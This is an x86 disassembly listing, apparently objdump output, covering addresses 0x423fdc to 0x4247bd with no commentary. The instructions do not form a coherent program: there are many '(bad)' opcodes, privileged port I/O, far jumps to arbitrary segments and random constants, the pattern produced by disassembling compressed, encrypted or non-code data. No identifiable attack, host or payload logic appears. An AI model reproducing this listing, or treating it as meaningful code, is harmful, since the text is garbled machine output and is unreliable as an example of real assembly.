  423fdc:	imul   edi,DWORD PTR [ebx-0x41],0xffffffc8
  423fe0:	push   es
  423fe1:	sub    dh,0x4e
  423fe4:	sbb    esi,ecx
  423fe6:	and    eax,0xcc1585b0
  423feb:	jns    0x42400b
  423fed:	test   BYTE PTR [ebp-0x1f26179a],al
  423ff3:	ret    0x82bd
  423ff6:	lds    ebx,FWORD PTR [ebp-0x52]
  423ff9:	push   0xffffff81
  423ffb:	pop    ecx
  423ffc:	mov    edi,0xaae96a15
  424001:	ror    BYTE PTR [esp+ebp*8],0xf4
  424005:	cdq    
  424006:	push   ebx
  424007:	in     eax,dx
  424008:	addr16 pop ss
  42400a:	dec    ebp
  42400b:	push   es
  42400c:	mov    fs,WORD PTR [eax+0x64fb6099]
  424012:	xchg   esp,eax
  424013:	fdivr  st(7),st
  424015:	sub    DWORD PTR [ecx-0x6d8a2201],edi
  42401b:	jnp    0x423fa0
  42401d:	or     DWORD PTR [eax],esp
  42401f:	pop    ebx
  424020:	inc    ecx
  424021:	or     cl,bh
  424023:	xchg   ebx,eax
  424024:	ret    
  424025:	lahf   
  424026:	sar    DWORD PTR [edx-0x1b],1
  424029:	xor    esp,DWORD PTR ds:0x9c95ff81
  42402f:	loop   0x424090
  424031:	sbb    al,0x55
  424033:	and    ecx,DWORD PTR [ebx]
  424035:	push   0x12
  424037:	dec    eax
  424038:	shl    BYTE PTR [edx-0x3b],0xc4
  42403c:	test   al,0xa1
  42403e:	push   ss
  42403f:	cwde   
  424040:	scas   eax,DWORD PTR es:[edi]
  424041:	fld    QWORD PTR [eax-0x558bc5a9]
  424047:	sbb    bl,BYTE PTR ds:0x1d9feaca
  42404d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42404e:	imul   DWORD PTR [edi+0x56]
  424051:	pop    ds
  424052:	arpl   WORD PTR [ebx],ax
  424054:	jne    0x4240cf
  424056:	sbb    al,0xfb
  424058:	ss mov ds,esi
  42405b:	push   esp
  42405c:	jge    0x42408b
  42405e:	xchg   ebp,eax
  42405f:	mov    edx,0xee6b6bbc
  424064:	mov    ebx,0x744ddd6b
  42406a:	xchg   ebp,eax
  42406b:	enter  0xa23e,0x36
  42406f:	dec    esp
  424070:	xor    esi,DWORD PTR [ebx-0x2d33c3ec]
  424076:	pop    edx
  424077:	push   edx
  424078:	adc    al,0x34
  42407a:	xchg   esi,eax
  42407b:	(bad)  
  42407c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42407d:	call   0x114865cd
  424082:	jmp    0x86e:0xd639a94a
  424089:	int3   
  42408a:	mov    ss,WORD PTR [eax]
  42408c:	xchg   edx,eax
  42408d:	or     BYTE PTR [ebp+0x6e447d82],cl
  424093:	pop    edx
  424094:	xor    BYTE PTR [eax-0x6d],cl
  424097:	xchg   ecx,eax
  424098:	mov    cl,0x73
  42409a:	mov    BYTE PTR [eax+esi*8+0x33],0x40
  42409f:	xchg   esi,eax
  4240a0:	mov    edx,0xf228bbfe
  4240a5:	push   edx
  4240a6:	lds    esi,FWORD PTR [ebx+ebp*2]
  4240a9:	(bad)  
  4240aa:	arpl   WORD PTR [ebp+ebx*4-0x79615d8f],bx
  4240b1:	sub    bh,BYTE PTR [ebx]
  4240b3:	(bad)  
  4240b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4240b5:	fs mov esp,ebp
  4240b8:	push   ds
  4240b9:	lea    esi,[esi+esi*1]
  4240bc:	mov    ch,0xfb
  4240be:	inc    ecx
  4240bf:	aaa    
  4240c0:	mov    ds:0xda995d47,eax
  4240c5:	repnz repz or eax,0xfc7a68e0
  4240cc:	sbb    edx,DWORD PTR [esi]
  4240ce:	xor    al,0x7a
  4240d0:	xchg   ebx,eax
  4240d1:	jnp    0x424127
  4240d3:	inc    esi
  4240d4:	test   BYTE PTR ds:0xa22085df,dh
  4240da:	mov    esi,0x302aec5e
  4240df:	shr    DWORD PTR [edx],1
  4240e1:	out    dx,eax
  4240e2:	bnd jbe 0x4240a2
  4240e5:	mov    edi,0x706509b9
  4240ea:	add    ah,al
  4240ec:	inc    eax
  4240ed:	mov    ebx,0xefe4368f
  4240f2:	inc    edx
  4240f3:	inc    esi
  4240f4:	inc    ebx
  4240f5:	scas   eax,DWORD PTR es:[edi]
  4240f6:	cdq    
  4240f7:	pusha  
  4240f8:	cmp    BYTE PTR [eax-0x5494f33e],0x16
  4240ff:	push   ebx
  424100:	jo     0x4240f4
  424102:	push   ds
  424103:	daa    
  424104:	dec    ecx
  424105:	push   0xffffffba
  424107:	sbb    ch,cl
  424109:	xor    DWORD PTR [edi],ecx
  42410b:	cs arpl cx,bx
  42410e:	les    edx,FWORD PTR [eax+0x34cf896b]
  424114:	ds js  0x424183
  424117:	lods   eax,DWORD PTR ds:[esi]
  424118:	mov    cl,0xd5
  42411a:	mov    bh,0xaf
  42411c:	mov    ds:0x9c0b8248,al
  424121:	enter  0xefd4,0x3d
  424125:	fidivr DWORD PTR [edi+0x383a98b2]
  42412b:	sub    al,0xd2
  42412d:	cmc    
  42412e:	ret    
  42412f:	add    dl,BYTE PTR [edi-0x3ce2fabf]
  424135:	xchg   edi,eax
  424136:	mov    bh,0xcd
  424138:	pop    ds
  424139:	inc    eax
  42413a:	imul   DWORD PTR [eax+eiz*4]
  42413d:	loop   0x4240ce
  42413f:	push   ecx
  424140:	pusha  
  424141:	cmp    ebx,ebp
  424143:	mov    edx,0x93d355c3
  424148:	ds pop esi
  42414a:	mov    ebp,0xb0d5e186
  42414f:	dec    esi
  424150:	outs   dx,BYTE PTR ds:[esi]
  424151:	icebp  
  424152:	repnz dec edi
  424154:	jg     0x4241b6
  424156:	jge    0x424197
  424158:	inc    BYTE PTR [ecx+0x5aac62c1]
  42415e:	mov    dl,0x2a
  424160:	retf   
  424161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424162:	add    ah,BYTE PTR [ecx-0x3ad82cda]
  424168:	pop    ecx
  424169:	xlat   BYTE PTR ds:[ebx]
  42416a:	ins    DWORD PTR es:[edi],dx
  42416b:	sbb    DWORD PTR ds:0x4bf062ee,ebx
  424171:	jle    0x424175
  424173:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424174:	jns    0x42412e
  424176:	mov    eax,0x1e418553
  42417b:	fbld   TBYTE PTR ds:0xd7913415
  424181:	sbb    eax,0x4121c941
  424186:	mov    ebp,0x267de6d5
  42418b:	and    edx,DWORD PTR [ecx-0x37]
  42418e:	cmp    ebx,DWORD PTR [esp+ebp*1-0x5a]
  424192:	daa    
  424193:	fmul   st(2),st
  424195:	and    esp,edi
  424197:	mov    dh,0x82
  424199:	fidivr DWORD PTR [esi]
  42419b:	sub    ecx,DWORD PTR [ebp+0x31]
  42419e:	(bad)  
  42419f:	jae    0x4241dd
  4241a1:	mov    cl,0xb6
  4241a3:	stos   BYTE PTR es:[edi],al
  4241a4:	pusha  
  4241a5:	and    DWORD PTR [ebp+0x2ba848],ecx
  4241ab:	fwait
  4241ac:	adc    al,0xf7
  4241ae:	xchg   ebx,eax
  4241af:	pop    esi
  4241b0:	xchg   ecx,eax
  4241b1:	pop    ss
  4241b2:	sbb    BYTE PTR [edi+ebx*1+0x42e8df43],ch
  4241b9:	mov    ecx,0xd5caa42f
  4241be:	pop    esp
  4241bf:	push   esi
  4241c0:	dec    ebx
  4241c1:	pusha  
  4241c2:	inc    esp
  4241c3:	mov    eax,0xe8333c8e
  4241c8:	data16 add bh,0x6b
  4241cc:	loopne 0x424176
  4241ce:	lds    ebx,FWORD PTR [ecx+0x37]
  4241d1:	int3   
  4241d2:	ins    BYTE PTR es:[edi],dx
  4241d3:	pop    ds
  4241d4:	lds    ebp,FWORD PTR [ebx+0x7c8c8950]
  4241da:	push   edi
  4241db:	(bad)  
  4241dd:	and    al,BYTE PTR [ebp+0x6bf8d10]
  4241e3:	hlt    
  4241e4:	out    dx,al
  4241e5:	call   0x9a42:0x49842b68
  4241ec:	sar    DWORD PTR [edi+eax*2-0x6ae10cac],0xe3
  4241f4:	mov    DWORD PTR [edx],0x8d595491
  4241fa:	fdivr  QWORD PTR [esi-0x53]
  4241fd:	add    esi,edi
  4241ff:	xchg   esi,eax
  424200:	mov    cl,0x50
  424202:	call   0x2b1f:0xe225bf7d
  424209:	adc    DWORD PTR [eax+edi*8-0x30],ecx
  42420d:	dec    ebp
  42420e:	jns    0x424269
  424210:	data16 arpl bx,di
  424213:	sub    DWORD PTR [edx+edi*2-0x25f216ad],ebp
  42421a:	into   
  42421b:	sbb    eax,0x7b677840
  424220:	push   ds
  424221:	cmovg  ecx,DWORD PTR [ebx+0x55cfabe4]
  424228:	adc    BYTE PTR [edi+0x59ac9ae9],bl
  42422e:	int3   
  42422f:	xchg   esp,eax
  424230:	push   esp
  424231:	or     ch,bh
  424233:	or     eax,0xccf45d01
  424238:	cmp    bh,bh
  42423a:	shl    ah,1
  42423c:	scas   eax,DWORD PTR es:[edi]
  42423d:	push   0xf8abff21
  424242:	jg     0x4241e6
  424244:	push   ebp
  424245:	lods   eax,DWORD PTR ds:[esi]
  424246:	out    0x30,eax
  424248:	in     eax,dx
  424249:	fwait
  42424a:	dec    eax
  42424b:	push   cs
  42424c:	jae    0x424269
  42424e:	jae    0x42423c
  424250:	or     bh,BYTE PTR gs:[ebp+0x3d]
  424254:	rcl    al,cl
  424256:	jb     0x42424e
  424258:	mov    esi,0xc95ef272
  42425d:	sbb    al,0xa9
  42425f:	and    eax,0xb9839b5c
  424264:	shl    DWORD PTR [eax-0x74],cl
  424267:	pop    ss
  424268:	mov    ecx,0x3e798af1
  42426d:	bound  esi,QWORD PTR [eax-0x7e]
  424270:	dec    edx
  424271:	fcom   DWORD PTR [ebx-0x5d83499c]
  424277:	std    
  424278:	sub    DWORD PTR ds:0x10730f83,edi
  42427e:	rcr    BYTE PTR [edi+0x62],cl
  424281:	fisubr WORD PTR [ecx-0x422800ec]
  424287:	loope  0x42425f
  424289:	into   
  42428a:	loopne 0x42423b
  42428c:	adc    DWORD PTR [ebx+0x47be1562],ebp
  424292:	stc    
  424293:	mov    esp,cs
  424295:	std    
  424296:	sub    BYTE PTR [ecx+ebx*8+0x21],bh
  42429a:	xor    al,0x3
  42429c:	js     0x4242e6
  42429e:	pop    ebx
  42429f:	sub    DWORD PTR [esi+0x6660c5],ebp
  4242a5:	cli    
  4242a6:	aad    0x3
  4242a8:	mov    eax,0xe8f68e7
  4242ad:	bound  ebp,QWORD PTR [edx+0x27a570a0]
  4242b3:	sub    eax,0xdcd6ad9d
  4242b8:	jmp    0x35f7:0x4cc2971c
  4242bf:	adc    BYTE PTR [esi+0x2b81e70c],al
  4242c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242c6:	mov    BYTE PTR [esi+ebx*4+0x5],al
  4242ca:	mov    ds:0xbe7d42ba,al
  4242cf:	mov    ds:0x84f23722,eax
  4242d4:	mov    dl,0x68
  4242d6:	in     eax,0x14
  4242d8:	jnp    0x424353
  4242da:	mov    esi,0xa52e87b1
  4242df:	fisub  WORD PTR ds:0xcce1519b
  4242e5:	nop
  4242e6:	mov    BYTE PTR [ebx+0x8],0x47
  4242ea:	stos   DWORD PTR es:[edi],eax
  4242eb:	fdivr  DWORD PTR [ebx+eiz*1-0x37]
  4242ef:	gs iret 
  4242f1:	test   BYTE PTR [eax+eax*2-0x72661761],0x90
  4242f9:	mov    ah,0x68
  4242fb:	add    eax,0x5581a207
  424300:	adc    eax,0x97ae7b4e
  424305:	rcr    DWORD PTR [eax],cl
  424307:	mov    edi,0xc81be4fc
  42430c:	xchg   esi,eax
  42430d:	add    ebx,edi
  42430f:	sbb    ch,bh
  424311:	xor    al,0xe7
  424313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424314:	cmp    bh,BYTE PTR [eax+0x5bff87bf]
  42431a:	push   ebx
  42431b:	(bad)  
  42431c:	xlat   BYTE PTR ds:[ebx]
  42431d:	jmp    0x424323
  42431f:	sub    ah,bh
  424321:	cmp    eax,0xda9e145d
  424326:	jmp    0xbad8020b
  42432b:	pop    esp
  42432c:	shl    BYTE PTR [ebx+0x31110f6],1
  424332:	push   ss
  424333:	push   ecx
  424334:	cs sahf 
  424336:	neg    DWORD PTR [edi+eax*2]
  424339:	mov    ebx,0xa61b511b
  42433e:	test   dh,bh
  424340:	nop
  424341:	dec    esi
  424342:	jbe    0x424385
  424344:	jmp    0x4242f1
  424346:	lods   al,BYTE PTR ds:[esi]
  424347:	mov    WORD PTR [edx],fs
  424349:	lods   eax,DWORD PTR ds:[esi]
  42434a:	xchg   esi,eax
  42434b:	mov    bh,0x2b
  42434d:	jbe    0x42432a
  42434f:	push   ebp
  424350:	inc    esp
  424351:	iret   
  424352:	popa   
  424353:	repz out 0x59,al
  424356:	les    eax,FWORD PTR [eax]
  424358:	lds    ecx,FWORD PTR [esi+0x280c51e6]
  42435e:	(bad)  
  42435f:	mov    dh,0x4c
  424361:	in     eax,dx
  424362:	or     DWORD PTR [ebx+0x765a04b3],ecx
  424368:	xchg   BYTE PTR [edi-0x14825674],al
  42436e:	fcomp  st(0)
  424370:	adc    eax,esi
  424372:	icebp  
  424373:	mov    ah,0x6e
  424375:	or     BYTE PTR [eax],al
  424377:	mov    DWORD PTR [ecx],ebp
  424379:	clc    
  42437a:	jge    0x4243d1
  42437c:	xor    al,0xc4
  42437e:	popa   
  42437f:	fistp  WORD PTR [edx-0x641e98eb]
  424385:	push   ebp
  424386:	pop    ss
  424387:	xlat   BYTE PTR ds:[ebx]
  424388:	xor    ecx,DWORD PTR [edi+edi*4-0x30]
  42438c:	js     0x424388
  42438e:	jle    0x424362
  424390:	sub    al,0x22
  424392:	fdiv   st(1),st
  424394:	jb     0x4243bf
  424396:	cmp    ecx,DWORD PTR [edx+0x54]
  424399:	fwait
  42439a:	mov    edx,0xf149f7b2
  42439f:	sub    dl,BYTE PTR [eax+0x79]
  4243a2:	and    DWORD PTR [edx+eiz*4-0x1a],edx
  4243a6:	stos   BYTE PTR es:[edi],al
  4243a7:	mov    edx,0x84d50820
  4243ac:	mov    ah,0xb6
  4243ae:	pop    ecx
  4243af:	test   edi,ebx
  4243b1:	test   BYTE PTR [edi-0x305558c],ah
  4243b7:	iret   
  4243b8:	and    esp,esp
  4243ba:	(bad)  
  4243bb:	imul   edx,DWORD PTR [ecx+0x79],0x0
	...
  4243ca:	pop    edx
  4243cb:	inc    esp
  4243cc:	dec    esi
  4243cd:	inc    ecx
  4243ce:	pop    esi
  4243cf:	dec    ebx
  4243d0:	pop    edi
  4243d1:	pop    edi
  4243d2:	inc    edx
  4243d3:	cwde   
  4243d4:	inc    esi
  4243d5:	loop   0x424408
  4243d7:	fld    DWORD PTR [edx]
  4243d9:	clc    
  4243da:	pushf  
  4243db:	rol    DWORD PTR [ecx],1
  4243dd:	add    BYTE PTR [esi+eax*1+0x0],bh
  4243e1:	add    BYTE PTR [edx-0x2e],cl
  4243e4:	lds    edx,FWORD PTR [edx+ebx*1-0x7c]
  4243e8:	jmp    0x36e3:0x722668b8
  4243ef:	mov    BYTE PTR [ebx-0x66eb4c62],al
  4243f5:	xchg   DWORD PTR [ebp-0x50cc4355],edx
  4243fb:	repz pop ebx
  4243fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243fe:	jbe    0x4243e5
  424400:	lods   al,BYTE PTR ds:[esi]
  424401:	(bad)  
  424402:	jo     0x4243d3
  424404:	js     0x4243cd
  424406:	dec    edx
  424407:	and    DWORD PTR [ecx+0x60f5d680],ecx
  42440d:	popf   
  42440e:	leave  
  42440f:	popa   
  424410:	cmp    BYTE PTR [ebp+edi*8+0x6e1116a7],ch
  424417:	cli    
  424418:	gs mov cl,0xda
  42441b:	cmp    ebx,DWORD PTR [edi-0x2f4009cb]
  424421:	cld    
  424422:	cmp    BYTE PTR [eax+edx*4-0x227b202e],ah
  424429:	pop    es
  42442a:	(bad)  
  42442b:	pop    esi
  42442c:	test   al,0x4b
  42442e:	jno    0x424431
  424430:	mov    ah,BYTE PTR [esi-0x72a6e53]
  424436:	push   esi
  424437:	cmp    bl,BYTE PTR [ebp-0x18e20438]
  42443d:	ret    
  42443e:	int3   
  42443f:	ins    BYTE PTR es:[edi],dx
  424440:	or     BYTE PTR [edx],ch
  424442:	fbld   TBYTE PTR [esp+eax*2-0x647f944e]
  424449:	xchg   eax,ecx
  42444b:	adc    BYTE PTR [ecx+0x7521e143],0xa4
  424452:	jbe    0x4243d9
  424454:	jp     0x42444e
  424456:	push   eax
  424457:	sub    bl,BYTE PTR [edi+0x2eec5696]
  42445d:	and    al,0x7e
  42445f:	xlat   BYTE PTR ds:[ebx]
  424460:	pushf  
  424461:	shl    DWORD PTR [eax],1
  424463:	push   0xeb43f2fc
  424468:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424469:	sub    dh,bl
  42446b:	mov    edi,0x51be5b1a
  424470:	daa    
  424471:	sub    eax,0x1b226c44
  424476:	test   eax,0xe8e255a2
  42447b:	cmp    DWORD PTR [eax-0x72ea5b5f],edi
  424481:	mov    ecx,0x53fec8e8
  424486:	lock ss xor dh,dh
  42448a:	aam    0xcf
  42448c:	push   0xfffffff1
  42448e:	push   esp
  42448f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424490:	adc    cl,BYTE PTR ss:[edi-0x7b]
  424494:	inc    esp
  424495:	or     al,0xff
  424497:	(bad)  
  424498:	mov    esp,0x9bff86e4
  42449d:	bound  ebp,QWORD PTR [esp+ebp*4]
  4244a0:	repnz outs dx,BYTE PTR ds:[esi]
  4244a2:	mov    esi,0x4ce10e76
  4244a7:	pop    ecx
  4244a8:	in     eax,dx
  4244a9:	mov    ?,WORD PTR [ebx-0x78fbfa65]
  4244af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244b0:	xchg   ebp,eax
  4244b1:	shr    DWORD PTR ds:0xea3064d2,1
  4244b7:	lock push cs
  4244b9:	loop   0x424496
  4244bb:	pop    esi
  4244bc:	jne    0x424508
  4244be:	push   0x46
  4244c0:	mov    edi,0x94ccaef
  4244c5:	xchg   edx,eax
  4244c6:	and    dh,dl
  4244c8:	lods   eax,DWORD PTR ds:[esi]
  4244c9:	rol    DWORD PTR [ebx+0x29fcc212],1
  4244cf:	cdq    
  4244d0:	sub    eax,0x491ec12
  4244d5:	or     dl,dl
  4244d7:	jns    0x42452c
  4244d9:	pop    ds
  4244da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4244db:	pop    ds
  4244dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4244dd:	sub    DWORD PTR [edx+0x74edfc55],ecx
  4244e3:	cmp    eax,0x3c4e1c86
  4244e8:	mov    gs,WORD PTR [ecx+0xb]
  4244eb:	push   ecx
  4244ec:	adc    cl,BYTE PTR [eax-0x338de639]
  4244f2:	clc    
  4244f3:	dec    edx
  4244f4:	or     BYTE PTR [eax+0x6c],bh
  4244f7:	sub    BYTE PTR [ecx],ah
  4244f9:	sbb    edx,DWORD PTR [edi+0x4d]
  4244fc:	call   0xc161:0x5d93f66
  424503:	ret    
  424504:	arpl   WORD PTR [ebx],cx
  424506:	push   esi
  424507:	dec    ebp
  424508:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424509:	dec    esp
  42450a:	out    0x6e,al
  42450c:	add    al,0x5b
  42450e:	and    eax,0xf1545f13
  424513:	test   BYTE PTR [ecx+0x37],al
  424516:	add    BYTE PTR [edi-0x20],0xaa
  42451a:	mov    esi,0xdce5d8bf
  42451f:	ss jbe 0x4244a6
  424522:	sbb    DWORD PTR [esi-0x12],esi
  424525:	mov    ebp,0xc229ba66
  42452a:	pushf  
  42452b:	adc    BYTE PTR [ebx+edx*1-0x3dd5f5f0],0xc5
  424533:	(bad)  
  424534:	loopne 0x424578
  424536:	outs   dx,DWORD PTR ds:[esi]
  424537:	gs loope 0x424534
  42453a:	dec    ebp
  42453b:	xor    dl,BYTE PTR [edx+0x31]
  42453e:	xor    edi,DWORD PTR [esi-0x1a]
  424541:	cdq    
  424542:	jp     0x42458c
  424544:	pop    eax
  424545:	xor    edx,edx
  424547:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  424549:	stos   DWORD PTR es:[edi],eax
  42454a:	sbb    ebp,DWORD PTR [eax+ebx*2]
  42454d:	sti    
  42454e:	jmp    0x4244f0
  424550:	dec    esi
  424551:	psubusw mm2,QWORD PTR [ebp+0x6a]
  424555:	bound  eax,QWORD PTR [edi]
  424557:	pop    ss
  424558:	ins    DWORD PTR es:[edi],dx
  424559:	div    esp
  42455b:	enter  0xc4f7,0x22
  42455f:	sub    ebp,DWORD PTR [edi-0x15150c7a]
  424565:	mov    al,0x92
  424567:	popa   
  424568:	call   0x4184e57b
  42456d:	pop    es
  42456e:	ss dec edx
  424570:	adc    BYTE PTR ds:0x9bfea8a8,dl
  424576:	xchg   ebx,eax
  424577:	mov    edx,0xc400e0be
  42457c:	shr    edi,0x46
  42457f:	sub    al,0x22
  424581:	fs (bad) 
  424583:	and    eax,esp
  424585:	in     al,0xa1
  424587:	imul   eax,DWORD PTR [ebp+esi*4+0x71],0x65
  42458c:	outs   dx,DWORD PTR ds:[esi]
  42458d:	outs   dx,BYTE PTR ds:[esi]
  42458e:	mov    al,ds:0xc7df34ed
  424593:	cmp    eax,0x9f22968b
  424598:	ret    0xb36
  42459b:	dec    esi
  42459c:	in     eax,0x6e
  42459e:	dec    esp
  42459f:	jg     0x4245c5
  4245a1:	repnz mov ebp,0x92c7e2b1
  4245a7:	call   0x6fe8:0x42e0c506
  4245ae:	sahf   
  4245af:	retf   
  4245b0:	mov    ?,esp
  4245b2:	data16 fnstsw WORD PTR [eax-0xdfabd5f]
  4245b9:	mov    ah,0xed
  4245bb:	ret    
  4245bc:	cdq    
  4245bd:	cmp    BYTE PTR [ebx],dl
  4245bf:	or     al,0x42
  4245c1:	cmc    
  4245c2:	mov    al,ds:0x84a877d
  4245c7:	(bad)  
  4245c8:	jge    0x42458c
  4245ca:	ds ins BYTE PTR es:[edi],dx
  4245cc:	mov    ah,0xf1
  4245ce:	jno    0x424582
  4245d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245d1:	mov    WORD PTR [edi+0x2c],fs
  4245d4:	fwait
  4245d5:	pop    edx
  4245d6:	or     ch,ah
  4245d8:	imul   DWORD PTR [edi+edx*2+0x0]
  4245dc:	shl    DWORD PTR [ecx+0x7bee3136],1
  4245e2:	sub    dh,dl
  4245e4:	inc    edx
  4245e5:	aas    
  4245e6:	pop    eax
  4245e7:	push   edi
  4245e8:	jo     0x424635
  4245ea:	or     BYTE PTR [esi],ch
  4245ec:	xlat   BYTE PTR ds:[ebx]
  4245ed:	scas   al,BYTE PTR es:[edi]
  4245ee:	std    
  4245ef:	out    dx,al
  4245f0:	push   0x45d3f67
  4245f5:	mov    esp,0x2e743544
  4245fa:	imul   edi,DWORD PTR [esi],0x5e
  4245fd:	push   ebp
  4245fe:	sbb    BYTE PTR [edi+0x31ae41fb],dl
  424604:	adc    al,bh
  424606:	push   ebx
  424607:	ss push es
  424609:	pusha  
  42460a:	fstp   DWORD PTR [esp+edx*2+0x142379b8]
  424611:	inc    ecx
  424612:	in     al,dx
  424613:	enter  0x8287,0x2d
  424617:	std    
  424618:	sahf   
  424619:	cmp    DWORD PTR [ecx-0x3dcb5dfd],ebp
  42461f:	jle    0x424603
  424621:	sub    eax,0x46f441e4
  424626:	cmc    
  424627:	sbb    BYTE PTR [edx],ch
  424629:	push   eax
  42462a:	fwait
  42462b:	clc    
  42462c:	xchg   esp,eax
  42462d:	fwait
  42462e:	inc    esi
  42462f:	(bad)  
  424631:	aad    0xf
  424633:	les    ebx,FWORD PTR [ecx+0x5f68ad5f]
  424639:	int3   
  42463a:	fnstcw WORD PTR [eax+0x5aeec599]
  424640:	outs   dx,DWORD PTR ds:[esi]
  424641:	repnz push ecx
  424643:	push   ebx
  424644:	ret    
  424645:	paddq  mm2,QWORD PTR ds:0x970cc7ae
  42464c:	icebp  
  42464d:	es add ah,ch
  424650:	xchg   ecx,eax
  424651:	cmp    al,0x2f
  424653:	fmul   DWORD PTR [ebp+0x67]
  424656:	cmc    
  424657:	and    BYTE PTR [edi+0x6f],dl
  42465a:	ror    cl,cl
  42465c:	inc    esi
  42465d:	xchg   esp,eax
  42465e:	enter  0x21e4,0xe1
  424662:	test   BYTE PTR [esp+edi*1],bh
  424665:	nop
  424666:	fmul   QWORD PTR [edx]
  424668:	adc    esi,DWORD PTR [edx]
  42466a:	je     0x4246c8
  42466c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42466d:	cdq    
  42466e:	push   es
  42466f:	fdiv   QWORD PTR [ebp-0x373aacb1]
  424676:	inc    eax
  424677:	retf   0x438
  42467a:	cdq    
  42467b:	pop    esp
  42467c:	or     DWORD PTR [esi-0x36],eax
  42467f:	inc    esi
  424680:	mov    bl,0x85
  424682:	mov    WORD PTR [eax],ss
  424684:	loope  0x424607
  424686:	xor    esi,ebx
  424688:	jmp    0x42462c
  42468a:	cwde   
  42468b:	jmp    0xfdc8:0x4cdbb7a4
  424692:	pop    ecx
  424693:	fstp   DWORD PTR [esi+0x1c]
  424696:	cmp    esi,DWORD PTR [esp+ebx*4]
  424699:	loop   0x42461d
  42469b:	mov    dh,BYTE PTR [ecx-0x2c857914]
  4246a1:	enter  0xc53e,0x63
  4246a5:	aas    
  4246a6:	and    BYTE PTR [ecx-0x7eb4d0ef],ah
  4246ac:	sub    eax,0x5fb11812
  4246b1:	dec    ebp
  4246b2:	mov    esi,0x911f7d02
  4246b7:	icebp  
  4246b8:	fstp   QWORD PTR [esp+eax*4-0x3b7d1626]
  4246bf:	sbb    eax,0x5d9ce5eb
  4246c4:	jmp    0xf5e9:0x4c0b2deb
  4246cb:	adc    edx,edx
  4246cd:	and    dh,BYTE PTR [ecx+0x14]
  4246d0:	aam    0xb2
  4246d2:	cwde   
  4246d3:	mov    ebx,0x2151f5b
  4246d8:	ds out dx,al
  4246da:	adc    bh,BYTE PTR [ebx+edx*8]
  4246dd:	sahf   
  4246de:	add    bh,BYTE PTR [edi+esi*4+0x14ba585c]
  4246e5:	xchg   esp,eax
  4246e6:	dec    ebx
  4246e7:	add    BYTE PTR [eax],ch
  4246e9:	nop
  4246ea:	shl    DWORD PTR [ebx-0x57],1
  4246ed:	add    BYTE PTR [eax+esi*2-0x7a],bl
  4246f1:	enter  0xe227,0xeb
  4246f5:	retf   0x5168
  4246f8:	fadd   DWORD PTR [esp+eiz*2]
  4246fb:	jp     0x4246d3
  4246fd:	aam    0x6c
  4246ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424700:	sbb    bh,BYTE PTR [eax]
  424702:	mov    cl,0x30
  424704:	inc    eax
  424705:	xor    al,BYTE PTR [eax+ebp*8-0x104c544]
  42470c:	dec    eax
  42470d:	inc    eax
  42470e:	inc    ebx
  42470f:	xchg   BYTE PTR [eax],bl
  424711:	dec    edx
  424712:	pusha  
  424713:	inc    edi
  424714:	dec    ebp
  424715:	fwait
  424716:	mov    esp,0x8e80ed8b
  42471b:	push   edx
  42471c:	div    ah
  42471e:	leave  
  42471f:	clc    
  424720:	pop    ds
  424721:	dec    esi
  424722:	xor    al,0x92
  424724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424725:	jno    0x424757
  424727:	mov    edi,0xbb8aa51b
  42472c:	push   ebx
  42472d:	out    dx,eax
  42472e:	push   0xffffffc7
  424730:	dec    edi
  424731:	sbb    DWORD PTR [eax],0xffffff93
  424734:	cmp    BYTE PTR [ebp-0x5ca12806],dh
  42473a:	xor    BYTE PTR [edi],bl
  42473c:	aam    0x8c
  42473e:	mov    dl,0x38
  424740:	mov    eax,ds:0xdf7e5676
  424745:	lahf   
  424746:	mov    ah,0x66
  424748:	out    0xc0,al
  42474a:	lahf   
  42474b:	sbb    al,0x50
  42474d:	mov    ds:0x328cfe28,al
  424752:	pop    ebp
  424753:	ins    BYTE PTR es:[edi],dx
  424754:	xor    BYTE PTR [ecx+ebp*1+0x6624f5f0],ah
  42475b:	ds mov eax,0x611940e3
  424761:	xchg   ebp,eax
  424762:	xor    esi,DWORD PTR [edx]
  424764:	loop   0x424773
  424766:	inc    esp
  424767:	mov    esp,0x458aeaad
  42476c:	std    
  42476d:	cli    
  42476e:	repnz xchg ecx,eax
  424770:	dec    esi
  424771:	jp     0x424713
  424773:	in     eax,0x1
  424775:	and    eax,0xe4663cf7
  42477a:	ins    BYTE PTR es:[edi],dx
  42477b:	jp     0x4247ce
  42477d:	addr16 inc ecx
  42477f:	dec    eax
  424780:	ins    BYTE PTR es:[edi],dx
  424781:	ja     0x42473b
  424783:	in     eax,0xb8
  424785:	mov    ds:0x1d1e378a,al
  42478a:	push   0x955da328
  42478f:	cli    
  424790:	mov    bl,0x82
  424792:	sub    eax,0xe5e12ebe
  424797:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  424799:	mov    al,ds:0xa0dc448c
  42479e:	push   ebx
  42479f:	xlat   BYTE PTR ds:[ebx]
  4247a0:	arpl   WORD PTR [esi],ax
  4247a2:	mov    ebp,0x2c7272cf
  4247a7:	pusha  
  4247a8:	xchg   BYTE PTR [ecx+0x64],bl
  4247ab:	stos   BYTE PTR es:[edi],al
  4247ac:	loope  0x4247cc
  4247ae:	leave  
  4247af:	imul   edx,DWORD PTR [edi+0x40],0xffffffa1
  4247b3:	push   cs
  4247b4:	adc    BYTE PTR es:[ecx],dh
  4247b7:	push   ebp
  4247b8:	shl    dh,0x30
  4247bb:	je     0x42479e
  4247bd:	lock push 0x25
